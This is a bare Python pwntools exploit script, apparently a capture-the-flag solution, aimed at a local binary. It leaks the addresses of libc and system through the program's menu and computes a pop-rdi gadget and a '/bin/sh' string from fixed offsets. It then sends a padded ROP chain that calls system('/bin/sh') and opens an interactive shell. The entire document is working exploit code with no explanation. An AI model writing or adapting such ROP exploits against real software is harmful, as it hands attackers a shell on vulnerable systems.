#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/a')
r.sendline(str(2))
r.sendlineafter('symbol: ', 'system')
r.recvuntil('Symbol system: ')
system = int(r.recvuntil('\n')[:-1], 16)
r.sendline(str(1))
r.recvuntil('libc.so.6: ')
libc = int(r.recvuntil('\n')[:-1], 16)
print "libc: ", hex(libc)
print "system: ", hex(system)
pop_rdi = libc - 0x60ffe3
sh = libc - 7898282
print "pop_rdi: ",hex(pop_rdi)
print "sh: ",hex(sh)
pad = "a"*8 + flat([pop_rdi, sh, system])

r.sendline(str(3))
r.sendlineafter('send (max 1024): ', str(len(pad)))
r.sendline(pad)
r.interactive()

